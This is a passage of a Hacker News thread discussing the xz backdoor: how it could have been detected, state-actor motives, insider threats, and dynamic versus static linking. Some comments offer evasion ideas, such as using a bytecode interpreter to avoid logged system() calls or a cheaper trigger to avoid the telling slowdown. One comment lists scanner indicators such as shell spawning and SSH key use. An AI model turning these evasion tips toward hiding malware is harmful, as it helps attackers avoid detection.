I understood it purely an oversight/fixable deficiency in the code), what are the chances of discovering this backdoor later, or are there tools that would have picked it up? Those questions are IMO relevant to understand if this kind of backdoor is the first one of the kind, or the first one that was uncovered. | | --- | --- | --- | | | |  |  | [xlii](user?id=xlii) [9 months ago](item?id=39882237)   | [parent](#39878872) | [next](#39879180) [–]  Working for about a year in an environment that was exposed to high volume of malevolent IT actors (and some pretty scary ones) I’d say: discovery chances very always pretty high. Keeping veil of secrecy requires unimaginable amount of energy. Same goes with truth consistency. One little slip and everything goes to nothing. Sometimes single sentence can start a chain of reaction and uncover meticulous crafted plan. That’s how crime if fought every day. Whereas police work has limited resources, software is analyzed daily by hobbyists as a hobby, professionals who still do it for a hobby, and professionals for professional reasons. Discovery was bound to happen eventually. XZ attack was very well executed. It’s a master piece. I wouldn’t be surprised if some state agencies would be involved. But it also was incredibly lucky. I know for sure for myself, but also many of my colleagues would go into long journey if found any of issues that are flagged right now. One takeaway is that chance of finding such issue would be impossible if xz/liblzma wouldn’t be open source (and yes I am also aware it enabled it in the first place) but imagine this existing in Windows or MacOS. | | --- | --- | --- | | | |  |  | [rigid](user?id=rigid) [9 months ago](item?id=39882547)   | [root](#39878872) | [parent](#39882237) | [next](#39901375) [–]  > it enabled it in the first place it took roughly two years including social engineering. I'd say the same approach is *much* easier in a big software company. | | --- | --- | --- | | | |  |  | [lazyasciiart](user?id=lazyasciiart) [9 months ago](item?id=39882588)   | [root](#39878872) | [parent](#39882547) | [next](#39901375) [–]  How do you mean? | | --- | --- | --- | | | |  |  | [rigid](user?id=rigid) [9 months ago](item?id=39882701)   | [root](#39878872) | [parent](#39882588) | [next](#39883300) [–]  I bet in the majority of cases, there's no need to pressure for merging. In a big company it's much easier to slip it in. Code seemingly less relevant for security is often not reviewed by a lot of people. Also, often people don't really care and just sign it off without a closer look. And when it's merged, no one will ever look at it again, other than with FOSS. | | --- | --- | --- | | | |  |  | [yborg](user?id=yborg) [9 months ago](item?id=39887193)   | [root](#39878872) | [parent](#39882701) | [next](#39883186) [–]  An insider could just be tasked to look for exploitable vulnerabilities in existing code and compile this information for outside entities without ever having to risk inserting a purpose-made backdoor. Considering the security state of most large codebases, there would be a bottomless well of them. | | --- | --- | --- | | | |  |  | [91bananas](user?id=91bananas) [9 months ago](item?id=39907832)   | [root](#39878872) | [parent](#39887193) | [next](#39883186) [–]  Who wants this job, that is capable of actually doing it properly? | | --- | --- | --- | | | |  |  | [sylware](user?id=sylware) [9 months ago](item?id=39883186)   | [root](#39878872) | [parent](#39882701) | [prev](#39887193) | [next](#39883300) [–]  I think you nailed it. | | --- | --- | --- | | | |  |  | [lodovic](user?id=lodovic) [9 months ago](item?id=39883300)   | [root](#39878872) | [parent](#39882588) | [prev](#39882701) | [next](#39901375) [–]  I've read about workplaces that were compromised with multiple people - they would hire a compromised manager, who would then install one or two developers, and shape the environment for them to prevent discovery, which would make these kind of exploits trivial. | | --- | --- | --- | | | |  |  | [leeoniya](user?id=leeoniya) [9 months ago](item?id=39884126)   | [root](#39878872) | [parent](#39883300) | [next](#39901375) [–]  so, Office Space? | | --- | --- | --- | | | |  |  | [timattrn](user?id=timattrn) [9 months ago](item?id=39901375)   | [root](#39878872) | [parent](#39882237) | [prev](#39882547) | [next](#39879180) [–]  Another independent maintainer would have helped too. Many eyes make bugs shallow, but just one extra genuine maintainer would have helped enormously. Clearly the existing maintainer trusted the attacker completely, but a second maintainer would not have. That's another social dimension to this attack: doing enough real work to suppress other maintainers coming along. | | --- | --- | --- | | | |  |  | [quatrefoil](user?id=quatrefoil) [9 months ago](item?id=39879180)   | [parent](#39878872) | [prev](#39882237) | [next](#39878911) [–]  If the exploit wasn't baing used, the odds would would be pretty low. They picked the right place to bury it (i.e., effectively *outside* the codebase, where no auditor ever looks). That said, if you're not using it, it defeats the purpose. And the more you're using it, the higher the likelihood you will be detected down the line. Compare to Solarwinds. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39879644)   | [root](#39878872) | [parent](#39879180) | [next](#39880681) [–]  I suspect I could have used this exact attack against 10,000 random SSH servers spread all over the world, and not be detected. Most people don't log TCP connections, and those that do don't go through their logs looking for odd certificates in ssh connections. And no common logging at the ssh/pam level would have picked this up. Your only chance is some sysadmin who has put 'tripwires' on certain syscalls like system(), fork() or mmap() looking for anything unusual. Even then, they might detect the attack, yet have no chance at actually finding how the malicious code loaded itself. | | --- | --- | --- | | | |  |  | [amscanne](user?id=amscanne) [9 months ago](item?id=39879982)   | [root](#39878872) | [parent](#39879644) | [next](#39879973) [–]  There is no ‘system()’ syscall, and fork/exec would be extremely common for opensshd — it’s what it does to spawn new shells which go on to do anything. I’m not arguing with the point, but this is a great place to hide — very difficult to have meaningful detection rules even for a sophisticated sysadmin. | | --- | --- | --- | | | |  |  | [ivlad](user?id=ivlad) [9 months ago](item?id=39881367)   | [root](#39878872) | [parent](#39879982) | [next](#39879973) [–]  This would be execve() that did not go through PAM dance and end up being privileged process. I \_think\_ it’ll look very different in ps —-forest output. | | --- | --- | --- | | | |  |  | [amscanne](user?id=amscanne) [9 months ago](item?id=39881748)   | [root](#39878872) | [parent](#39881367) | [next](#39879973) [–]  It’s true that there’s a precise set of circumstances that would be different for the RCE (the lack of a PAM dance prior, same process group & session, no allocation of a pseudo-terminal, etc.). My point was merely that I don’t think they are commonly encoded in rule sets or detection systems. It’s certainly possible, but my guess is sshd is likely to have a lot of open policy. I’m really curious if someone knows different and there *are* hard detection for those things. (Either way, I bet there will be in the future!) | | --- | --- | --- | | | |  |  | [ivlad](user?id=ivlad) [9 months ago](item?id=39882021)   | [root](#39878872) | [parent](#39881748) | [next](#39879973) [–]  I am trying to figure out if auditctl is expressive enough to catch unexpected execve() from sshd: basically anything other than /usr/bin/sshd (for privsep) executed with auid=-1 should be suspicious. | | --- | --- | --- | | | |  |  | [matrix\_overload](user?id=matrix_overload) [9 months ago](item?id=39879973)   | [root](#39878872) | [parent](#39879644) | [prev](#39879982) | [next](#39882481) [–]  With sufficient data points, you can do A/B and see that all affected systems run a specific version of Linux distro, and eventually track it down to a particular package. | | --- | --- | --- | | | |  |  | [bastawhiz](user?id=bastawhiz) [9 months ago](item?id=39880738)   | [root](#39878872) | [parent](#39879973) | [next](#39882481) [–]  Unless you're the bad actor, you have no way to trigger the exploit, so you can't really do an a/b test. You can only confirm which versions of which distros *are* vulnerable. And that assumes you have sufficient instrumentation in place to know the exploit has been triggered. *Even then*, who actually has a massive fleet of publicly exposed servers all running a mix of distros/versions? You might run a small handful of distros, but I suspect anyone running a fleet large enough to actually collect a substantial amount of data probably also has tools to upgrade the whole fleet (or at least large swaths) in one go. Certainly there are companies where updates are the wild west, but the odds that they're all accessible to and controllable by a single motivated individual who can detect the exploit is essentially zero. | | --- | --- | --- | | | |  |  | [guenthert](user?id=guenthert) [9 months ago](item?id=39882481)   | [root](#39878872) | [parent](#39879644) | [prev](#39879973) | [next](#39880681) [–]  There are those who run sshd on a non-standard port and log all attempts to connect to the standard port though. | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39886744)   | [root](#39878872) | [parent](#39882481) | [next](#39880681) [–]  Those connection attempts wouldn't ever reach the daemon though, let alone get to preauth. So how would an exploitation attempt even be distinguishable from, say, a harmless random password guess if neither ever gets to see the daemon? | | --- | --- | --- | | | |  |  | [lll-o-lll](user?id=lll-o-lll) [9 months ago](item?id=39880681)   | [root](#39878872) | [parent](#39879180) | [prev](#39879644) | [next](#39880422) [–]  > That said, if you're not using it, it defeats the purpose. Not if this was injected by a state actor. My experience with other examples of state actor interference in critical infrastructure, is that the exploit is *not* used. It’s there as a capability to be leveraged only in the context of military action. | | --- | --- | --- | | | |  |  | [sunshine\_reggae](user?id=sunshine_reggae) [9 months ago](item?id=39882706)   | [root](#39878872) | [parent](#39880681) | [next](#39880422) [–]  And that leads to the question: Why do non-friendly state actors (apparently) not detect and eliminate exploits like this one? Supposedly, they should have the same kind of budgets for code review (or even more, if we combine all budgets of all non-friendly state actors, given the fact that we are talking about open-source code). | | --- | --- | --- | | | |  |  | [phire](user?id=phire) [9 months ago](item?id=39882865)   | [root](#39878872) | [parent](#39882706) | [next](#39884180) [–]  How to you know they don't? When a state actor says "We found this exploit", people will get paranoid and wondering if the fix is actually an exploit. Not saying it happened in this case, but it's really easy for a state actor to hide an extensive audit behind some parallel construction. Just create a cover story pretending to be a random user who randomly noticed ssh logins being slow, and use that story to point maintainers to the problem, without triggering anyone's paranoia, or giving other state actors evidence of your auditing capabilities. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39884180)   | [root](#39878872) | [parent](#39882706) | [prev](#39882865) | [next](#39880422) [–]  If a government is competent enough to detect this, they're competent enough to add it to their very own cyberweapon stockpile. They wouldn't be able to do that for this particular exploit since it requires successfully decrypting data encrypted by the attacker's secret key. A zero day caused by an accidental bug though? There's no reason for them to eliminate the threat by disclosing it. They can patch their own systems and add yet another exploit to their hoard. | | --- | --- | --- | | | |  |  | [Ajedi32](user?id=Ajedi32) [9 months ago](item?id=39895759)   | [root](#39878872) | [parent](#39884180) | [next](#39880422) [–]  > They can patch their own systems "Their own systems" will necessarily include *lots* of civilian infrastructure. Hard to make sure all that gets patched without issuing a CVE, let alone without anyone in the general public even being aware of the patch. | | --- | --- | --- | | | |  |  | [golergka](user?id=golergka) [9 months ago](item?id=39880422)   | [root](#39878872) | [parent](#39879180) | [prev](#39880681) | [next](#39882524) [–]  > That said, if you're not using it, it defeats the purpose. Not always. Weapons of war are most useful when you don't have to actually use them, because others know that you have it. This exploit could be used sparingly to boost a reputation of a state-level actor. Of course, other parties wouldn't know about this particular exploit, but they would see your cyber capabilities in the rare occasions where you decided to use it. | | --- | --- | --- | | | |  |  | [kosh2](user?id=kosh2) [9 months ago](item?id=39904934)   | [root](#39878872) | [parent](#39880422) | [next](#39882524) [–]  > because others know that you have it. Except that cyber weapons like these are 1. One time use 2. Expire upon detection (mostly) I think this is simply just a tool for offensive action only. | | --- | --- | --- | | | |  |  | [rigid](user?id=rigid) [9 months ago](item?id=39882524)   | [root](#39878872) | [parent](#39879180) | [prev](#39880422) | [next](#39881536) [–]  > where no auditor ever looks Well, software supply chains are a thing. "where no auditor ever *is paid* to look" would be more correct. | | --- | --- | --- | | | |  |  | [bandrami](user?id=bandrami) [9 months ago](item?id=39881536)   | [root](#39878872) | [parent](#39879180) | [prev](#39882524) | [next](#39882501) [–]  The purpose would presumably be to use this about an hour before the amphibious assault on $WHEREVER begins | | --- | --- | --- | | | |  |  | [guenthert](user?id=guenthert) [9 months ago](item?id=39882501)   | [root](#39878872) | [parent](#39879180) | [prev](#39881536) | [next](#39878911) [–]  Hmmh, brings up the question, if no exploit actually occurred, was a crime committed? Can't the authors claim that they were testing how quickly the community of a thousand eyes would react, you know, for science? | | --- | --- | --- | | | |  |  | [NekkoDroid](user?id=NekkoDroid) [9 months ago](item?id=39882540)   | [root](#39878872) | [parent](#39882501) | [next](#39878911) [–]  That's like asking if someone that went into a crowded place with a full-automatic and started shooting at people but "purposefully missing" is just testing how fast law enforcement reacts, you know, for science. After something like 2 years of planning this out and targeted changes this isn't something "just done for science". | | --- | --- | --- | | | |  |  | [guenthert](user?id=guenthert) [9 months ago](item?id=39884858)   | [root](#39878872) | [parent](#39882540) | [next](#39878911) [–]  Or is it rather like someone posting a video on youtube on how to pick a common lock? And what's about the fellows of U of Minnesota? | | --- | --- | --- | | | |  |  | [tempay](user?id=tempay) [9 months ago](item?id=39886067)   | [root](#39878872) | [parent](#39884858) | [next](#39878911) [–]  It’s more analogous to getting hired at the lock company and sabotaging the locks you assemble to be trivially pickible if you know the right trick. The University of Minnesota case is an interesting one to compare to. I could imagine them being criminally liable but being given a lenient punishment. I wonder if the law will end up being amended to better cover this, if it isn’t already explicitly illegal. | | --- | --- | --- | | | |  |  | [brokenmachine](user?id=brokenmachine) [9 months ago](item?id=39901981)   | [root](#39878872) | [parent](#39886067) | [next](#39878911) [–]  What happened at the University of Minnesota? | | --- | --- | --- | | | |  |  | [tempay](user?id=tempay) [9 months ago](item?id=39903012)   | [root](#39878872) | [parent](#39901981) | [next](#39878911) [–]  They intentionally tried to contribute security bugs into the linux kernel as a research project: <https://lwn.net/Articles/854645/> | | --- | --- | --- | | | |  |  | [wepple](user?id=wepple) [9 months ago](item?id=39878911)   | [parent](#39878872) | [prev](#39879180) | [next](#39879197) [–]  I expect a lot of people will be doing a whole lot of thinking along these lines over the next months. Code review? Some kind of behavioral analysis? IMO the call to system() was kind of sloppy, and a binary capabilities scanner could have potentially identified a path to that. | | --- | --- | --- | | | |  |  | [tux3](user?id=tux3) [9 months ago](item?id=39879060)   | [root](#39878872) | [parent](#39878911) | [next](#39879842) [–]  I think behavioral analysis could be promising. There's a lot of weird stuff this code does on startup that any reasonable Debian package on the average install should not be doing in a million years. Games and proprietary software will sometimes ship with DRM protection layers that do insane things in the name of obfuscation, making it hard to distinguish from malware. But (with only a couple exceptions) there's no reason for a binary or library in a Debian package to ever try to write the PLT outside of the normal mechanism, to try to overwrite symbols in other modules, to add LD audit hooks on startup, to try to resolve things manually by walking ELF structures, to do anti-debug tricks, or just to have any kind of obfuscation or packing that free software packaged for a distro is not supposed to have. Some of these may be (much) more difficult to detect than others, some might not be realistic. But there are several plausible different ways a scanner could have detected something weird going on in memory during ssh startup. No one wants a Linux antivirus. But I think everyone would benefit from throwing all the behavioral analysis we can come up with at new Debian package uploads. We're very lucky someone noticed this one, we may not have the same luck next time. | | --- | --- | --- | | | |  |  | [raggi](user?id=raggi) [9 months ago](item?id=39879234)   | [root](#39878872) | [parent](#39879060) | [next](#39879691) [–]  Except had we been doing that they would have put guards in place to detect it - as they already had guards to avoid the code path when a debugger is attached, to avoid building the payload in when it's not one of the target systems, and so on. Their evasion was fairly extensive, so we'd need many novel dynamic systems to stand a chance, and we'd have to guard those systems extremely tightly - the author got patches into oss-fuzz as well to "squash false positives". All in all, adding more arms to the arms race does raise the bar, but the bar they surpassed already demonstrated tenacity, long term thinking, and significant defense and detection evasion efforts. | | --- | --- | --- | | | |  |  | [tux3](user?id=tux3) [9 months ago](item?id=39879399)   | [root](#39878872) | [parent](#39879234) | [next](#39879691) [–]  I broadly agree, but I think we can draw a parallel with the arms race of new exploit techniques versus exploit protection. People still manage to write exploits today, but now you must find an ASLR leak, you must chain enough primitives to work around multiple layers of protection, it's generally a huge pain to write exploits compared to the 90s. Today the dynamic detection that we have for Linux packages seems thin to non-existent, like the arms race has not even started yet. I think there is a bit of low-hanging fruit to make attacker lives harder (and some much higher-hanging fruit that would be a real headache). Luckily there is an asymmetry in favor of the defenders (for once). If we create a scanner, we do not \_have\_ to publish every type of scan it knows how to do. Much like companies fighting spammers and fraud don't detail exactly how they catch bad actors. (Or, for another example, I know the Tor project has a similar asymmetry to detect bad relays. They collaborate on their relay scanner internally, but no one externally knows all the details.) | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39881559)   | [root](#39878872) | [parent](#39879399) | [next](#39879449) [–]  This is an arms race that is largely won by attackers, actually. Sophisticated attacks are caught by them sometimes but usually the author has far more knowledge or cleverer tricks than the person implementing the checks, who is limited by their imagination of what they think an attacker might do. | | --- | --- | --- | | | |  |  | [wepple](user?id=wepple) [9 months ago](item?id=39889626)   | [root](#39878872) | [parent](#39881559) | [next](#39879449) [–]  I’m not sure that attackers “win” this arms race; the cost has gone through the roof and their chance of detection constantly increases. Indeed, defenders are often outgunned, but at a minimum we’ve pushed the level of effort way into nation-state territory, which is a good start. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39901067)   | [root](#39878872) | [parent](#39889626) | [next](#39879449) [–]  Indeed. But a lot of the effort has come from measures in areas that are much more stacked towards defenders (as it should). | | --- | --- | --- | | | |  |  | [raggi](user?id=raggi) [9 months ago](item?id=39879449)   | [root](#39878872) | [parent](#39879399) | [prev](#39881559) | [next](#39879691) [–]  Yeah, perhaps something akin to an OSS variant of virustotal's multi-vendor analysis. I'm still not sure it would catch this, but as you say, raising the bar isn't something we tend to regret. | | --- | --- | --- | | | |  |  | [robocat](user?id=robocat) [9 months ago](item?id=39879691)   | [root](#39878872) | [parent](#39879060) | [prev](#39879234) | [next](#39879279) [–]  > we may not have the same luck next time If the prior is 1 was out there (this one), the chances that there is 1+ still undetected seems fairly high to me. To behaviourally detect this requires many independent actors to be looking in independent ways(e.g. security researchers, internal teams). Edit: I mean with private code & tests (not open source, nor purchasable antivirus). It's not easy to donate to Google Zero. Some of the best funded and most skilled teams seem to be antivirus vendors (and high value person protection). I hate the antivirus industry yet I've been helped by it (the anti-tragedy of the commons). Commonly public detection code (e.g. open source) is likely to be defeated by attackers with a lot of resources. Hard to protect ourselves against countries where the individuals are safe from prosecution. Even nefarious means like assasination likely only work against individuals and not teams. | | --- | --- | --- | | | |  |  | [bandrami](user?id=bandrami) [9 months ago](item?id=39881738)   | [root](#39878872) | [parent](#39879691) | [next](#39879279) [–]  > If the prior is 1 That would surprise me greatly | | --- | --- | --- | | | |  |  | [lazyasciiart](user?id=lazyasciiart) [9 months ago](item?id=39882605)   | [root](#39878872) | [parent](#39881738) | [next](#39879279) [–]  I think you’re saying “I would be surprised if there is only 1 exploit like this that already exists” which is what the previous comment was also saying. “If the prior is one” is often used to mean “we know for sure that there is one”. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39879279)   | [root](#39878872) | [parent](#39879060) | [prev](#39879691) | [next](#39879942) [–]  > to try to overwrite symbols in other modules, to add LD audit hooks on startup, to try to resolve things manually by walking ELF structures I want to name one thing: when Windows failed to load a DLL because a dependency was missing, it doesn't tell you what was missed. To get the information, you have to interact with the DLL loader with low level Windows APIs. In some circumstances Linux apps may also have the need. Like for printing a user friendly error message or recovery from a non-fatal error. For example, the patchelf tool that is used for building portable python packages. > No one wants a Linux antivirus It is not true. Actually these software are very popular in enterprise settings. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39879942)   | [root](#39878872) | [parent](#39879060) | [prev](#39879279) | [next](#39879341) [–]  > But I think everyone would benefit from throwing all the behavioral analysis we can come up with at new Debian package uploads. Why "new uploads" and not also "all existing"? | | --- | --- | --- | | | |  |  | [ffsm8](user?id=ffsm8) [9 months ago](item?id=39879341)   | [root](#39878872) | [parent](#39879060) | [prev](#39879942) | [next](#39881579) [–]  > *No one wants a Linux antivirus* ClamAV has been around for a very long time at this point. It's just not installed on servers, usually | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39880126)   | [root](#39878872) | [parent](#39879341) | [next](#39880226) [–]  Does not have to be installed. See this: [https://learn.microsoft.com/en-us/azure/defender-for-cloud/c...](https://learn.microsoft.com/en-us/azure/defender-for-cloud/concept-agentless-data-collection#how-agentless-scanning-works) A cloud provider can take snapshots of running VMs then run antivirus scan offline to minimize the impact to the customers. Similarly, many applications are containerized and the containers are stateless, we can scan the docker images instead. This approach has been quite mature. | | --- | --- | --- | | | |  |  | [nwallin](user?id=nwallin) [9 months ago](item?id=39880226)   | [root](#39878872) | [parent](#39879341) | [prev](#39880126) | [next](#39879497) [–]  In general, my gut feeling is that I expect the majority ClamAV installations to be configured to scan for Windows viruses in user submitted content. Email, hosting sites, etc. | | --- | --- | --- | | | |  |  | [kemotep](user?id=kemotep) [9 months ago](item?id=39879497)   | [root](#39878872) | [parent](#39879341) | [prev](#39880226) | [next](#39879818) [–]  To say nothing of enterprise EDR/XDR solutions that have linux versions. These things aren’t bulletproof but can be 1 layer in your multilayer security posture. | | --- | --- | --- | | | |  |  | [EasyMark](user?id=EasyMark) [9 months ago](item?id=39879818)   | [root](#39878872) | [parent](#39879341) | [prev](#39879497) | [next](#39881579) [–]  don't most people who use that just use it for scanning incoming email attachments usually? | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39880191)   | [root](#39878872) | [parent](#39879818) | [next](#39881579) [–]  ClamAV also has a lot of findings when scanning some open source project's source code. For example, LLVM project's test data. Because some of the test data are meant to check if a known security bug is fixed, from a antivirus software perspective these data files can be seen as exploits. ClamAV is commonly used. Or, I would suggest adding it to every CI build pipeline. Most time it wouldn't have any finding, but it is better than nothing. I would like to offer free help if an open source project has the need to harden their build pipelines and their release process. | | --- | --- | --- | | | |  |  | [cipherzero](user?id=cipherzero) [9 months ago](item?id=39881579)   | [root](#39878872) | [parent](#39879060) | [prev](#39879341) | [next](#39879842) [–]  Sorry, I'm unfamiliar with PLT what does stand for? | | --- | --- | --- | | | |  |  | [intelVISA](user?id=intelVISA) [9 months ago](item?id=39881646)   | [root](#39878872) | [parent](#39881579) | [next](#39879842) [–]  procedure linkage table | | --- | --- | --- | | | |  |  | [XorNot](user?id=XorNot) [9 months ago](item?id=39879842)   | [root](#39878872) | [parent](#39878911) | [prev](#39879060) | [next](#39879738) [–]  If you think about it this is a data-providence problem though. The exploit was hidden in "test" code which gets included in release code by compiler flags. Now, if there was a proper chain of accountability for data, then this wouldn't have been possible to hide the way it is - any amount of pre-processing resulting in the release tarball including derived products of "test" files would be suspicious. The problem is we *don't* actually track data providence like this - no build system does. The most we do is <git hash in> -> <some deterministic bits out>. But we don't include the human readable data which explains how that transform happens at enough levels. | | --- | --- | --- | | | |  |  | [paulmd](user?id=paulmd) [9 months ago](item?id=39882919)   | [root](#39878872) | [parent](#39879842) | [next](#39879738) [–]  You don’t need to go to that extent even - simply properly segregating test resources from dist resources would have prevented this, and that’s something Java has been doing for 20 years. It’s not sufficient against a determined attacker, but it does demonstrate just how unserious the C world is about their build engineering. I literally can’t think of a single time in 15 years of work that I’ve ever seen a reason for a dist build to need test resources. That’s at best a bug - if it’s a dist resource it goes in the dist resources, not test. And if the tooling doesn’t do a good job of making that mistake difficult… it’s bad tooling. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39879738)   | [root](#39878872) | [parent](#39878911) | [prev](#39879842) | [next](#39880705) [–]  I'm really surprised they did a call to system() rather than just implement a tiny bytecode interpreter. A bytecode interpreter that can call syscalls can be just a few hundred bytes of code, and means you can avoid calling system() (whose calls might be logged), and avoid calling mprotect to make code executable (also something likely to raise security red flags). The only downside of a bytecode interpreter is the whole of the rest of your malware needs to be compiled to your custom bytecode to get the benefits, and you will take a pretty big performance hit. Unless you're streaming the users webcam, that probably isn't an issue tho. | | --- | --- | --- | | | |  |  | [brokenmachine](user?id=brokenmachine) [9 months ago](item?id=39902038)   | [root](#39878872) | [parent](#39879738) | [next](#39880705) [–]  XZ backdoor v2.0 is sure to have that now. | | --- | --- | --- | | | |  |  | [ashishbijlani](user?id=ashishbijlani) [9 months ago](item?id=39880705)   | [root](#39878872) | [parent](#39878911) | [prev](#39879738) | [next](#39879245) [–]  I’ve been building Packj [1] to detect malicious PyPI/NPM/Ruby/PHP/etc. dependencies using behavioral analysis. It uses static+dynamic code analysis to scan for indicators of compromise (e.g., spawning of shell, use of SSH keys, network communication, use of decode+eval, etc). It also checks for several metadata attributes to detect bad actors (e.g., typo squatting). 1. <https://github.com/ossillate-inc/packj> | | --- | --- | --- | | | |  |  | [jnwatson](user?id=jnwatson) [9 months ago](item?id=39879245)   | [root](#39878872) | [parent](#39878911) | [prev](#39880705) | [next](#39879260) [–]  The real problem was doing expensive math for every connection. If it had relied on a cookie or some simpler-to-compute pre-filter, no one would have been the wiser. | | --- | --- | --- | | | |  |  | [anarazel](user?id=anarazel) [9 months ago](item?id=39879569)   | [root](#39878872) | [parent](#39879245) | [next](#39879260) [–]  The slowdown is actually in the startup of the backdoor, not when it's actually performing authentication. Note how in the original report even sshd -h (called in the right environment to circumvent countermeasures) is slow. | | --- | --- | --- | | | |  |  | [klabb3](user?id=klabb3) [9 months ago](item?id=39881529)   | [root](#39878872) | [parent](#39879569) | [next](#39879260) [–]  Wow. Given the otherwise extreme sophistication this is such a blunder. I imagine the adversary is tearing their hair out over this. 2-3 years of full time infiltration work down the drain, for probably more than a single person. As for the rest of us, we got lucky. In fact, it’s quite hilarious that some grump who’s thanklessly perf testing other people’s code is like “no like, exploit makes my system slower”. | | --- | --- | --- | | | |  |  | [mslot](user?id=mslot) [9 months ago](item?id=39883061)   | [root](#39878872) | [parent](#39881529) | [next](#39882344) [–]  You're responding to said grump ;) Andres is one of the most prolific PostgreSQL committers and his depth of understanding of systems performance is second to none. I wouldn't have guessed he would one day save the world with it, but there you go. | | --- | --- | --- | | | |  |  | [mitjam](user?id=mitjam) [9 months ago](item?id=39882344)   | [root](#39878872) | [parent](#39881529) | [prev](#39883061) | [next](#39879260) [–]  If it was not fulltime work I wonder what else they have been working on with different accounts. | | --- | --- | --- | | | |  |  | [raggi](user?id=raggi) [9 months ago](item?id=39879260)   | [root](#39878872) | [parent](#39878911) | [prev](#39879245) | [next](#39880539) [–]  the call to system is obfuscated, static analysis wouldn't see it | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39880539)   | [root](#39878872) | [parent](#39878911) | [prev](#39879260) | [next](#39879239) [–]  Dynamic linking was a mistake and should be eliminated | | --- | --- | --- | | | |  |  | [kbenson](user?id=kbenson) [9 months ago](item?id=39881896)   | [root](#39878872) | [parent](#39880539) | [next](#39881650) [–]  That this was dynamically linked is the least interesting thing about it IMO. It was a long term I filtration where they got *legitimate* commit access to a well used library. If xz was statically linked in some way, or just used as an executa Le to compress something (like the kernel), the same problems exist and no dynamic linking would need to be involved. | | --- | --- | --- | | | |  |  | [radiospiel](user?id=radiospiel) [9 months ago](item?id=39882758)   | [root](#39878872) | [parent](#39881896) | [next](#39882107) [–]  > If xz was statically linked in some way, or just used as an executa Le to compress something (like the kernel), the same problems exist and no dynamic linking would need to be involved. even more so: all binaries dynamically linking xz can be updated by installing a fixed library version. For statically linked binaries: not so much, each individual binary would have to be relinked, good luck with that. | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39883772)   | [root](#39878872) | [parent](#39882758) | [next](#39882929) [–]  In exchange, each binary can be audited as a final product on its own merits, rather than leaving the final symbols-in-memory open to all kinds of dubious manipulation. | | --- | --- | --- | | | |  |  | [Cloudef](user?id=Cloudef) [9 months ago](item?id=39882929)   | [root](#39878872) | [parent](#39882758) | [prev](#39883772) | [next](#39882107) [–]  > For statically linked binaries: not so much, each individual binary would have to be relinked, good luck with that. Is essentially what all distros with sane build systems does. | | --- | --- | --- | | | |  |  | [Cloudef](user?id=Cloudef) [9 months ago](item?id=39882107)   | [root](#39878872) | [parent](#39881896) | [prev](#39882758) | [next](#39881650) [–]  Not true, it would be much harder to hook into openssl functions if the final executable was static [1], the only way is that if the openssl function this attack targeted, actually called a function from libxz. [1] <https://sourceware.org/glibc/wiki/GNU_IFUNC> Dynamic loading is relic of the past and cause of many headaches in linux ecosystem, in this case it also just obfuscates the execution path of the code more so you can't really rely on the code you are reading. Unfortunately I don't think it's possible to completely get rid of dynamic loading as some components such as GPU drivers require it, but it should be reduced to minimum. | | --- | --- | --- | | | |  |  | [ynik](user?id=ynik) [9 months ago](item?id=39883496)   | [root](#39878872) | [parent](#39882107) | [next](#39882316) [–]  This particular approach of hooking would be much harder; but a malicious xz has other options as well. It's already in the code path used by dpkg when unpacking packages for security updates, so it could just modify the sshd binary, or maybe add a rootkit to the next kernel security update. It seems foolish to change our systems to stop one of the steps the attacker used after their code was already running as root; the attacker can just pick something else; as root they have essentially unlimited options. | | --- | --- | --- | | | |  |  | [Cloudef](user?id=Cloudef) [9 months ago](item?id=39883599)   | [root](#39878872) | [parent](#39883496) | [next](#39888534) [–]  True, but such code changes in xz would be much easier to audit than all the dynamic loading shenanigans, even if obfuscated in the build system. The GNU's dynamic loader specially has grown to be very complicated (having all these OOP-like polymorphism features on linker / loader level ...) and I think we should tone down the usage of dynamic linking as I see it as low hanging fruit for attacks in general. | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39888534)   | [root](#39878872) | [parent](#39883496) | [prev](#39883599) | [next](#39883791) [–]  There are other reasons to change, though. The main thing to consider here is that static linking is the "OG" way of doing things, and also the simplest and the most easily understandable one. There are also obvious perf benefits to it when it comes to optimizing compilers. On the other hand, dynamic linking was originally more or less just a hack to deal with memory-restricted environments in the face of growing amounts of code. It was necessary at the time because we simply wouldn't have things like X or Windows without it way back when. But RAM is nowhere near as sparse these days, and it could be even less so if there was a concerted push on hardware vendors to stop skimping on it. So why don't we *remove the hack* and get back to a simple model that is much easier to understand, implement, and audit? | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39889686)   | [root](#39878872) | [parent](#39888534) | [next](#39883791) [–]  agree, it’s difficult to believe that people believe in dynamic linking so strongly that they are unwilling to consider abandoning it even in the face of obvious problems like this xz situation | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39883791)   | [root](#39878872) | [parent](#39883496) | [prev](#39888534) | [next](#39882316) [–]  “It seems foolish to change” Rejecting evidence in favor of retaining preconceptions is certainly popular. | | --- | --- | --- | | | |  |  | [FeepingCreature](user?id=FeepingCreature) [9 months ago](item?id=39882316)   | [root](#39878872) | [parent](#39882107) | [prev](#39883496) | [next](#39881650) [–]  Looking at IFUNC, there never seems to be a reason to allow function loading from a different library than the one the call is in, right? Maybe a restriction like that could be built in. Or just explicitly enumerate the possible substitutions per site. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39943859)   | [root](#39878872) | [parent](#39882316) | [next](#39883802) [–]  IFUNC isn't used directly to patch the functions of another library here, it's just the entry point for the exploit code. IFUNC is used 